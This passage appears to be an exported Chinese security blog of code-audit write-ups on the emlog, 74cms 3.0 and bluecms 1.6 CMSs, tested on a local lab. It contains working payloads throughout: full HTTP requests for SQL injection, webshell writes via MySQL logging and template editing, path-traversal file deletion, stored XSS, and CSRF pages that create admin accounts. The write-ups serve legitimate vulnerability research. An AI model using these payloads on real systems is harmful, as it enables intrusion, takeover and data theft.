max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVzcf6UrvpBos4OrwUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/emlog/admin/blogger.php?active_del=1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1Connection: close------WebKitFormBoundaryVzcf6UrvpBos4OrwContent-Disposition: form-data; name=&quot;photo&quot;../../info.php 3.通过后台数据库备份上传webshell对于在/emlog/init.php 中的变量 $action，当我们通过GET方式传入$action[]数组的形式，会出现语法错误报错导致的网站路径泄露，可以考虑结合sql注入写入webshell 在/admin/data.php中发现了可以进行本地数据库备份，并可以上传数据库备份文件 那么就可以考虑加入语句 SELECT &quot;&lt;?php phpinfo(); ?&gt;&quot; INTO outfile &quot;E:\\php\\PHPTutorial\\WWW\\emlog\\shell.php&quot;;如果网站数据库的配置secure_file_priv为空，那么我们就可以直接在网站根目录下写入webshell 我们先随意备份一个数据库文件，然后加入上述语句，上传 结果出现了报错信息The MySQL server is running with the --secure-file-priv option so it cannot execute this statement说明数据库配置secure_file_priv为null，并且我们无法通过SQL语句改变该配置值，在数据库中验证show global variables like &#39;%secure%&#39;; 所以我们考虑另一种方法，通过设置SQL日志的方式，首先需要保证general_log=on，再修改general_log_file的日志写入文件绝对路径 在数据库文件中加入语句： 123SET GLOBAL general_log = &apos;on&apos;;SET GLOBAL general_log_file = &apos;E:/php/PHPTutorial/WWW/emlog/shell.php&apos;;SELECT &apos;&lt;?php phpinfo(); ?&gt;&apos;; 然后上传 可以看出显示了上传成功 然后我们可以看到在网站的根目录下出现了shell.php即我们上传的webshell，它实际上是一个日志文件，只不过我们加入了可执行的Php代码 访问 4.通过上传ZIP文件上传webshell/admin/plugin.php页面可以上传一个zip压缩包，并在后台将压缩包解压成文件 跟踪emUnZip()函数，在/include/lib/function.base.php下： 图中有我自己添加的测试代码，用来测试ZipArchive类的getNameIndex和getFromName函数的输出值 我们试着上传一个test.zip，压缩包中包含demo文件夹，demo文件夹下包含demo.php文件 可以看出这里getNameIndex()函数返回结果是压缩包下的文件夹名即demo/，在768行中$dir . $plugin_name . &#39;.php&#39;拼接的结果是demo/demo.php即压缩包下的目录内容，从响应包结果来看是上传成功的 所以猜出getFromName函数应该是判断压缩包下的文件目录如果与传入的参数一致，则返回true，所以可以看出我们上传的文件夹名必须和文件名是相同的，后面即可解压压缩包，上传webshell 如果我们上传的压缩包只包含一个php文件，可以看一下测试的响应结果： 那么$dir . $plugin_name . &#39;.php&#39;拼接的结果是demo.php/demo.php.php，从响应结果Location: ./plugin.php?error_e=1来看很明显是上传失败，返回-1，说明是$re == false导致的，即getFromName函数判断压缩包不存在该目录 5.存储型XSS/admin/write_log.php添加文章存在html代码形式，尝试直接添加&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 添加后访问网站首页出现弹框 抓包分析 跟踪到/admin/save_log.php文件 $content变量只有经过转义处理，还是过滤不当引起的xss 总结该CMS较小，代码简洁易懂，大部分的漏洞，由于全局不存在输入过滤，所以通过全局搜索POST，GET数据发现的，还是那句话，输入过滤不够，导致的漏洞","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/tags/代码审计/"}]},{"title":"代码审计--74cms3.0","slug":"代码审计-74cms3.0","date":"2019-03-18T12:15:00.000Z","updated":"2019-03-20T12:12:36.692Z","comments":true,"path":"/posts/5451/","link":"","permalink":"https://Foxgrin.github.io/posts/5451/","excerpt":"记录74cms3.0审计过程以及漏洞分析","text":"记录74cms3.0审计过程以及漏洞分析 全局分析先进入根目录的index.php，跟进包含的头文件/include/common.inc.php，该文件又包含了三个文件，其中/data/config.php和/include/74cms_version.php为网站配置和版本文件，无需关心。/include/common.fun.php为函数文件。继续往下审计，发现21-30行对输入数据进行了过滤 12345678910if (!empty($_GET))&#123;$_GET = addslashes_deep($_GET);&#125;if (!empty($_POST))&#123;$_POST = addslashes_deep($_POST);&#125;$_COOKIE = addslashes_deep($_COOKIE);$_REQUEST = addslashes_deep($_REQUEST); 在/include/common.fun.php跟踪addslashes_deep函数 过滤总结起来就是对$_GET $_POST $_COOKIE $_REQUEST数据都进行单引号双引号的转义，以及过滤标签的处理 GET,POST,COOKIE都有过滤，那么IP字段有没有过滤呢，按照之前审计都有一个getip()函数来获取头部的IP字段，果然在101行发现该函数 但是这里进行了正则匹配过滤出格式合法的IP值，所以我们无法利用IP字段 也就是说，在后面的审计过程中，只要发现文件包含了/include/common.inc.php，那么就无法通过注入标签进行XSS攻击，以及限制了SQL注入，但是，我们注意配置文件/include/mysql.class.php中的第29行设置了数据库的编码方式为GBK，所以在有单引号或双引号包裹的情况下是可以考虑进行宽字节注入的 类似于前台，/admin/后台的文件头部也包含了/admin/include/admin_common.inc.php，过滤如下： 1234567if(!get_magic_quotes_gpc())&#123; $_POST = admin_addslashes_deep($_POST); $_GET = admin_addslashes_deep($_GET); $_COOKIE = admin_addslashes_deep($_COOKIE); $_REQUEST = admin_addslashes_deep($_REQUEST);&#125; 跟进admin_addslashes_deep函数 1234567891011function admin_addslashes_deep($value)&#123; if (empty($value)) &#123; return $value; &#125; else &#123; return is_array($value) ? array_map('admin_addslashes_deep', $value) : addslashes($value); &#125;&#125; 可以发现后台对于客户端提交的数据只有转义的处理，是不会过滤掉标签的 漏洞分析1.任意文件删除漏洞/admin/admin_article.php第151-152行中存在可利用变量$_GET[&#39;img&#39;]导致任意文件删除漏洞 在全局分析中，我们知道，后台对$_GET只有转义的处理，所以我们构造路径穿越进行删除文件 payload：?act=del_img&amp;img=../../info.php 2.SQL注入/user/user_personal.php第947-951行存在可利用变量$setsqlarr导致SQL注入 我们可以注意到这里的数组变量$setsqlarr中的各个属性变量都只有转义的处理就拼接到SQL语句中，这是一个用户基本信息保存的功能代码，当查询不到$SESSION[&#39;uid&#39;]即未保存过信息时，会使用INSERT语句。反之则使用UPDATE语句，然后将保存的个人信息渲染到html页面中，跟踪一下updatetable()函数 了解语句后，我们先保存一个个人信息 之后再进行修改操作，payload如下： 12345678910111213141516POST /74cms/user/user_personal.php?act=userprofile_save HTTP/1.1Host: 127.0.0.1Content-Length: 193Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/74cms/user/user_personal.php?act=userprofileAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: QS[uid]=1; QS[username]=user01; QS[password]=f9b56fc246a5142ad76408997edc1e4d; QS[utype]=2; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6Connection: closerealname=123&amp;sex=%C4%D0&amp;birthday=111111&amp;addresses=12312332&amp;mobile=18912345678&amp;phone=254221&amp;qq=12345&amp;msn=123%df&apos;,`profile`=(select pwd from 74_admin) where uid=1#&amp;profile=123&amp;Submit=%B1%A3%B4%E6 拼接后的sql语句为： 1UPDATE 74cms_members_info SET `realname`='123', `sex`='男', `birthday`='111111', `addresses`='12312332', `mobile`='18912345678', `phone`='254221', `qq`='12345', `msn`='123�\\\\\\',`profile`=database() where uid=1#', `profile`='123' WHERE uid='1'` 执行后profile字段显示的值就是数据库名 另外/user/user_company_points.php第861行同样存在可利用变量$setsqlarr，导致SQL注入 payload： 12345678910111213141516POST /74cms/user/user_company_points.php?act=company_profile_save HTTP/1.1Host: 127.0.0.1Content-Length: 416Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/74cms/user/user_company_points.php?act=company_profileAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: QS[uid]=2; QS[username]=user02; QS[password]=fd14a8ceb080688b964f9f89a66a730d; QS[utype]=1; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6Connection: closecompanyname=1234&amp;nature_cn=%B9%FA%C6%F3&amp;nature=46&amp;trade_cn=%BC%C6%CB%E3%BB%FA%C8%ED%BC%FE%2F%D3%B2%BC%FE&amp;trade=1&amp;district_cn=%B5%D8%C7%F81+%2F+%B5%D8%C7%F81%D7%D3%C0%E0&amp;district=1&amp;sdistrict=2&amp;scale_cn=20%C8%CB%D2%D4%CF%C2&amp;scale=80&amp;registered=123&amp;currency=%C8%CB%C3%F1%B1%D2&amp;contact=123&amp;telephone=1234567&amp;email=123%40123.com&amp;website=%df&apos;,`contents`=database() where uid=2#&amp;address=123&amp;contents=123&amp;Submit=%B1%A3%B4%E6 该cms存在多处$setsqlarr都可以利用，不止以上两个，不一一列举 3.任意文件写入漏洞/admin/admin_templates.php第125行fwrite()函数中存在可利用变量$handle和$tpl_content，导致任意文件写入漏洞 在全局分析中，我们已经知道后台对我们提交的数据只有转义处理，所以我们可以很容易的写入一个webshell，payload： 1234567891011121314POST /74cms/admin/admin_templates.php?act=do_edit HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: QS[uid]=1; QS[username]=user01; QS[password]=f9b56fc246a5142ad76408997edc1e4d; QS[utype]=2; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 61tpl_dir=../&amp;tpl_name=info.php&amp;tpl_content=&lt;?php phpinfo(); ?&gt; 执行完成后在网站根目录下写入一个webshell 4.存储型XSS漏洞/link/add_link.php第36行存在可利用变量$_POST[&#39;link_logo&#39;]在/admin/admin_link.php中将该变量渲染到/admin/templates/default/link/admin_link.htm的&lt;span style=&quot;color:#FF6600&quot; title=&quot;&lt;img src= border=0/&gt;&quot; class=&quot;vtip&quot;&gt;[logo]&lt;/span&gt;中，存在存储型XSS漏洞 /link/add_link.php对添加的链接信息数组$setsqlarr有转义加去标签的处理 然后/admin/admin_link.php中get_links()函数将添加的链接信息从数据库中取出渲染到前台页面中 我们跟进link/admin_link.htm 在第58行中&lt;span style=&quot;color:#FF6600&quot; title=&quot;&lt;img src= border=0/&gt;&quot; class=&quot;vtip&quot;&gt;[logo]&lt;/span&gt;我们可以看到前台将link_logo这以变量值作为img标签的读取源，虽然有去标签的处理，但是这里我们不需要加入标签，利用onerror事件也可以进行XSS攻击 payload： 12345678910111213141516POST /74cms/link/add_link.php?act=save HTTP/1.1Host: 127.0.0.1Content-Length: 117Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/74cms/link/add_link.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: QS[uid]=2; QS[username]=user02; QS[password]=fd14a8ceb080688b964f9f89a66a730d; QS[utype]=1; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6Connection: closealias=QS_index&amp;link_name=123&amp;link_url=123&amp;link_logo=%23+onerror%3Dalert%28%2Fxss%2F%29&amp;app_notes=&amp;Submit=%CC%E1%BD%BB 执行成功后，在页面每次将鼠标移动至[logo]处都会弹框 5.CSRF漏洞/admin/admin_users.php第42-68行由于未加入token验证，可以造成CSRF漏洞任意添加管理员账号 攻击过程：构造一个虚假404页面诱导管理员点击，页面代码如下： 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL /info.php was not found on this server.&lt;/p&gt;&lt;script&gt; function add() &#123; var xmlhttp = new XMLHttpRequest(); var xmldata = 'admin_name=test2&amp;email=1234%40123.com&amp;password=123456&amp;password1=123456&amp;rank=123&amp;submit3=%CC%ED%BC%D3'; xmlhttp.open('POST','http://127.0.0.1/74cms/admin/admin_users.php?act=add_users_save',true); xmlhttp.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); xmlhttp.withCredentials='true'; xmlhttp.send(xmldata); &#125; add();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 页面利用ajax技术在后台将注册信息提交到admin/admin_users.php 另外在74cms 3.6版本中添加了token机制认证，我们知道token认证机制是取出当前页面提交的token与存放在Session中的token值进行比较，相同则通过验证，每当我们刷新一次页面，token值就会发生变化。但是我们仍然可以进行CSRF攻击，办法就是利用iframe框架访问token值的页面，再利用js代码获取token值与信息一起提交即可，附上3.6版本csrf攻击的代码： 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;script type=\"text/javascript\"&gt; function add() &#123; var token = document.getElementById('hack').contentWindow.document.getElementsByName('hiddentoken')[0].value; var xmlhttp = new XMLHttpRequest(); var xmldata = 'admin_name=test2&amp;email=1234%40123.com&amp;password=123456&amp;password1=123456&amp;rank=123&amp;submit3=%CC%ED%BC%D3&amp;hiddentoken='+token; xmlhttp.open('POST','http://127.0.0.1/74cms3.6/admin/admin_users.php?act=add_users_save',true); xmlhttp.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); xmlhttp.withCredentials='true'; xmlhttp.send(xmldata); &#125;&lt;/script&gt;&lt;iframe src=\"http://127.0.0.1/74cms3.6/admin/admin_users.php?act=add_users\" id='hack' border='0' style='display:none'&gt;&lt;/iframe&gt;&lt;body onload=\"add()\"&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL /info.php was not found on this server.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 总结该cms很多漏洞的利用点都在于未对SQL数组变量$setsqlarr进行过滤以及对后台输入只有转义处理，存在诸多输入过滤不足的情况","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/tags/代码审计/"}]},{"title":"代码审计--bluecms1.6","slug":"代码审计-bluecms","date":"2019-03-13T11:15:00.000Z","updated":"2019-03-14T12:00:06.871Z","comments":true,"path":"/posts/52227/","link":"","permalink":"https://Foxgrin.github.io/posts/52227/","excerpt":"记录bluecms1.6审计过程以及漏洞分析","text":"记录bluecms1.6审计过程以及漏洞分析 前言笔者属于新手，刚接触审计不久，刚拿到一个完全陌生的cms，一开始完全不知道如何下手，所以我通过不断阅读别人的审计文章，重点观察别人的审计思路，一开始看别人的审计文章其实不应该关注这个cms到底有什么漏洞，因为那都是别人已经审计好了的，你应该重点关注别人到底是怎么挖到这个洞的，这样你才能锻炼独立审计的能力，这篇文章我也会把我审计的全过程思路分享出来。 全局分析首先拿到这个bluecms，安装完成后，我首先观察整个cms的文件结构 其实每个文件夹的功能从名字就大概能猜出，比如/admin肯定是后台管理员才能访问进行管理的；/include肯定是用来包含的全局文件，例如一些函数定义的文件，一些数据库配置，过滤文件等等；/templates肯定是一些模板文件，看到这个文件夹就能猜到这里面放着的都是一些html模板，用来通过后台进行渲染的。当然这都是初步的大致浏览，具体还要等到后面访问页面才知道。 下面，浏览了网页结构，就开始审计具体文件了，那么问题来了，审计哪个呢，这么多文件。这里我的思路还是首先访问根目录下的index.php文件，因为它是整个网站的首页。 先来看看首页的代码： 好多，将近300行，肯定不可能一行行的看，这里我首先还是先看主页面的开头包含了什么文件 12require_once('include/common.inc.php');require_once(BLUE_ROOT.'include/index.fun.php'); 前面说到/include文件夹，果然就包含了里面的文件，这些文件往往对我们审计过程都非常重要，一定要重视 先来看看include/common.inc.php 12345678#30-36行if(!get_magic_quotes_gpc())&#123; $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST);&#125; 我们马上就发现了在30-36行处，对全局数组POST，GET，COOKIES，REQUEST都进行了转义处理，所以只要通过这些方式输入的数据中存在单引号，双引号都会被转义。这就是为什么强调开头这些包含文件的重要性，如果我们没看到，就忽略了这些过滤，后面例如sql注入的注入点被单引号包裹，我们不知道有过滤还以为可以进行注入 另外在24-28行处还包含了一些函数文件 12345require_once (BLUE_ROOT.'include/common.fun.php');require_once(BLUE_ROOT.'include/cat.fun.php');require_once(BLUE_ROOT.'include/cache.fun.php');require_once(BLUE_ROOT.'include/user.fun.php');require_once(BLUE_ROOT.'include/index.fun.php'); 后面遇到看不懂的函数，可以通过跟踪函数名在这些文件中搜索 就这样大致浏览一下这些文件的开头部分，后面其实大多都是功能部分，我们有的其实都不用去关注，毕竟我们本来就不可能每行都去看一遍 漏洞挖掘1.跟踪输入变量笔者一开始审计，也是很盲目，看了半天代码，还是看不出哪儿存在漏洞，主要一个原因还是代码太多了。所以感觉挖掘漏洞，还是要有方法，有明确思路，这样才能有效快速。在我浏览别人的审计文章时，看到了一句话：“有输入的地方就可能存在漏洞”。这句话讲的很有道理，这么多的web漏洞，本质上都是存在用户的输入才导致的，所以，我一开始就是关注每个文件哪里存在用户的输入。 从根目录开始，按顺序我们先来看看ad_js.php文件 1$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; 文件很短，我们可以一口气将它看完，开头就有我们可以通过GET方式进行控制的变量，继续看下去，我们马上就看到了一个sql查询语句 1$ad = $db-&gt;getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id); 在前面我们说过，在common.inc.php文件中对我们的输入方式进行转义的过滤，我们注意到这个文件开头就包含了它，说明这里对$ad_id变量是存在转义处理的，但是这里的sql语句中$ad_id是没有单引号包裹的，所以我们根本不需要去关注过滤，很明显这里就存在了sql注入漏洞，具体利用后面在一起说 接下来是ann.php文件，这个文件就有点长，但是我们无需关心，只看开头有没有可以利用的变量 12$ann_id = !empty($_REQUEST['ann_id']) ? intval($_REQUEST['ann_id']) : '';$cid = !empty($_REQUEST['cid']) ? intval($_REQUEST['cid']) : 1; 可以看到，这里虽然输入变量，但是经过了intval函数的过滤处理，所以我们无法利用，这个文件我们就先pass掉，就这个道理继续往下看 来到user.php文件，存在可利用的变量$from和$act： 12$act = !empty($_REQUEST['act']) ? trim($_REQUEST['act']) : 'default';$from = !empty($_REQUEST['from']) ? $_REQUEST['from'] : ''; 这个文件也很长，我们直接搜索关键字跟踪变量$from，发现大多数做为参数传入了showmsg函数，例如112行 1showmsg('欢迎您 '.$user_name.' 回来，现在将转到...', $from); 我们可以大致猜到这个函数是用来进行页面跳转的，具体我们可以跟踪这个函数，这里我在seay审计系统中进行内容全局搜索function showmsg，查询结果在/include/common.fun.php文件中对这个函数进行了定义，审计该文件中的这个函数： 12345678910111213function showmsg($msg,$gourl='goback', $is_write = false)&#123; global $smarty; $smarty-&gt;caching = false; $smarty-&gt;assign(\"msg\",$msg); $smarty-&gt;assign(\"gourl\",$gourl); $smarty-&gt;display(\"showmsg.htm\"); if($is_write) &#123; write_log($msg, $_SESSION['admin_name']); &#125; exit();&#125; 这里面又利用了两个函数assign和display，同样继续跟踪这两个函数 123456789101112131415161718function assign($tpl_var, $value = null) &#123; if (is_array($tpl_var))&#123; foreach ($tpl_var as $key =&gt; $val) &#123; if ($key != '') &#123; $this-&gt;_tpl_vars[$key] = $val; &#125; &#125; &#125; else &#123; if ($tpl_var != '') $this-&gt;_tpl_vars[$tpl_var] = $value; &#125; &#125; function display($resource_name, $cache_id = null, $compile_id = null) &#123; $this-&gt;fetch($resource_name, $cache_id, $compile_id, true); &#125; assign函数作用是将第二个参数作为键值，第一个参数作为键名。至于display函数，跟踪fetch函数有点长，这里我没有很详细的去看（其实是看不太懂…），只知道大致功能就是跳转页面。然后整个showmsg功能就是将assign中的数据渲染到display中的html页面。而这里传入参数$from，我们就可以猜测，可以通过该参数进行任意页面跳转的作用 依次类推，通过这个方法，相信只要耐心足够，一定很容易可以挖到一些漏洞 2.通过工具审计漏洞第一种方法只是粗略的审计，一定还会有我们疏忽的漏洞，所以第二种方法，我用了审计工具来帮助我们进行审计，这里使用Seay审计系统，个人觉得还是不错的一款工具，还能进行关键字全局搜索。当然工具只是帮你分析可能存在的漏洞，并不是决定，具体我们还得一个个去耐心分析 可以看到，工具审计非常多可能存在的漏洞，但我还是按照第一种方法的思想，找存在输入的点，这样能更高效的寻找漏洞 例如上图，我们发现了变量$ip是通过头部的IP字段获取的，在这个字段我们是不用去关心转义过滤的，是个非常好利用的变量，所以我们赶紧跟踪/include/common.fun.php这个文件 12345678910111213141516171819202122232425262728function getip()&#123; if (getenv('HTTP_CLIENT_IP')) &#123; $ip = getenv('HTTP_CLIENT_IP'); &#125; elseif (getenv('HTTP_X_FORWARDED_FOR')) &#123; //获取客户端用代理服务器访问时的真实ip 地址 $ip = getenv('HTTP_X_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_X_FORWARDED')) &#123; $ip = getenv('HTTP_X_FORWARDED'); &#125; elseif (getenv('HTTP_FORWARDED_FOR')) &#123; $ip = getenv('HTTP_FORWARDED_FOR'); &#125; elseif (getenv('HTTP_FORWARDED')) &#123; $ip = getenv('HTTP_FORWARDED'); &#125; else &#123; $ip = $_SERVER['REMOTE_ADDR']; &#125; return $ip;&#125; 我们可以发现这个关键函数getip，它返回的变量$ip我们是可以利用的，继续搜索这个函数getip，看看哪里可以利用到 发现/comment.php文件中存在通过该函数拼接而成的sql语句，猜测就可能存在sql注入漏洞，跟踪该文件 12$sql = \"INSERT INTO \".table('comment').\" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '\".getip().\"', '$is_check')\"; 在113-114行找到了拼接的sql语句，我们可以通过伪造头部X-Forwarded-For字段来进行sql注入 依次类推，通过工具帮助我们审计，也能挖掘到更多漏洞 3.搜索危险函数第三种方法，我们还可以搜索一些导致漏洞的危险函数，例如unlink，include，move_uploaded_file函数等，这里搜索unlink函数为例 搜索结果显示出非常多unlink函数中存在我们可以输入进行控制的变量，例如/user.php下的616行： 123if (file_exists(BLUE_ROOT.$_POST[&apos;lit_pic&apos;])) &#123; @unlink(BLUE_ROOT.$_POST[&apos;lit_pic&apos;]); &#125; 就存在可以利用的变量$_POST[&#39;lit_pic&#39;]，我们跟踪该变量，发现除了开头包含文件的转义处理以外，无其他过滤地方，很明显我们就可以利用该变量进行网站根目录下任意文件删除的操作 4.借鉴别人的文章一开始审计，难免会有很多漏洞自己忽略掉没审计到，这时候我们就需要多去参考别人审计该cms的文章，寻找出自己未审计出的漏洞，并总结自己为什么没有找出该漏洞，这样就为下次审计积累更多的经验 漏洞分析1.UNION注入/ad_js.php第19行通过变量$ad_id拼接的sql语句由于变量$ad_id未进行过滤并且无引号包裹，存在SQL注入漏洞 123456789$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';if(empty($ad_id))&#123; echo 'Error!'; exit();&#125;$ad = $db-&gt;getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id);echo \"&lt;!--\\r\\ndocument.write(\\\"\".$ad_content.\"\\\");\\r\\n--&gt;\\r\\n\"; 有回馈信息，所以我们直接用union注入 首先通过order by测试查询字段数为7，然后通过测试得知回显字段在第6位 注数据库payload： 1?ad_id=0%20union%20select%200,0,0,0,0,database(),0 注表名payload： 1/ad_js.php?ad_id=0%20union%20select%200,0,0,0,0,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0 注blue_ad表下的列名payload： 1?ad_id=0%20union%20select%200,0,0,0,0,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x626c75655f6164),0 注意将blue_ad转化为十六进制 2.INSERT INTO注入/include/common.fun.php下getip()函数返回存在通过头部IP字段获取的变量，跟踪该函数发现comment.php下第113行可利用getip()获取的可控变量进行sql注入 12$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;; 这是一个添加评论功能的页面，功能整体代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445elseif($act == 'send')&#123; if(empty($id)) &#123; return false; &#125; $user_id = $_SESSION['user_id'] ? $_SESSION['user_id'] : 0; $mood = intval($_POST['mood']); $content = !empty($_POST['comment']) ? htmlspecialchars($_POST['comment']) : ''; $content = nl2br($content); $type = intval($_POST['type']); if(empty($content)) &#123; showmsg('评论内容不能为空'); &#125; if($_CFG['comment_is_check'] == 0) &#123; $is_check = 1; &#125; else &#123; $is_check = 0; &#125; $sql = \"INSERT INTO \".table('comment').\" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '\".getip().\"', '$is_check')\"; $db-&gt;query($sql); if($type == 1) &#123; $db-&gt;query(\"UPDATE \".table('article').\" SET comment = comment+1 WHERE id = \".$id); &#125; elseif($type == 0) &#123; $db-&gt;query(\"UPDATE \".table('post').\" SET comment = comment+1 WHERE post_id = \".$id); &#125; if($_CFG['comment_is_check'] == 1) &#123; showmsg('请稍候，您的评论正在审核当中...','comment.php?id='.$id.'&amp;type='.$type); &#125; else &#123; showmsg('发布评论成功','comment.php?id='.$id.'&amp;type='.$type); &#125;&#125; 要执行SQL语句所需要控制的变量为$_GET[&#39;act&#39;] == &#39;send&#39;,$_POST[&#39;content&#39;] != &#39;&#39;, 然后分析SQL语句，这是一个INSERT INTO语句，注入的方式有挺多种，这里我采用的是通过select case when then else语句进行延时注入的方法，payload如下： 123456789101112131415POST /comment.php?act=send HTTP/1.1Host: 127.0.0.1Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: bdshare_firstime=1551059496947; PHPSESSID=gv5b2n1b6uk12phkt0fookutc4; BLUE[user_id]=3; BLUE[user_name]=user02; BLUE[user_pwd]=1e6a32c00852bd4dbf303ab4d54a1380; detail=5X-Forwarded-For:1&apos;+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),&apos;1&apos;)# Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 28id=1&amp;mood=1&amp;comment=1&amp;type=1 拼接后的sql语句为： 1INSERT INTO blue_comment (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES ('', '1', '3', '1', '1', '1', '1', '1'+(select case when(ascii(substr(database(),1,1))=98) then sleep(1) else 1 end),'1')#, '1') 之后就是写脚本注入了 同样的漏洞存在于/include/common.inc.php第四十五行存在通过getip()函数获得的变量$online_ip，跟踪该变量发现/guest_book.php第77-78行同样存在SQL注入漏洞 1$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;$online_ip&apos;, &apos;$content&apos;)&quot;; 123456789101112131415elseif ($act == 'send')&#123; $user_id = 